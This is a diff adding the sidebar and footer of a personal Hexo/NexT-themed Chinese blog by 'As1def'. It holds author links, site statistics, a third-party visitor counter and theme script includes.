+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="As1def"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">As1def</p>
+  <div class="site-description" itemprop="description">听懂了一首歌,生活中回响着旋律</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/As1def" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;As1def" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:why.asldef@qq.com" title="E-Mail → mailto:why.asldef@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://plus.google.com/As1def" title="Google → https:&#x2F;&#x2F;plus.google.com&#x2F;As1def" rel="noopener" target="_blank"><i class="fab fa-google fa-fw"></i>Google</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/brianchen2006" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;brianchen2006" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa ||fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">As1def</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">147k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">2:13</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i>
+<span id="busuanzi_container_site_uv">
+本站总访客数:<span id="busuanzi_value_site_uv"></span>&nbsp;&nbsp;| 
+</span>
+<span id="busuanzi_container_site_pv">
+  &nbsp;本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script type="text/javascript" src="/js/firework.js"></script>
+</body>
+</html>
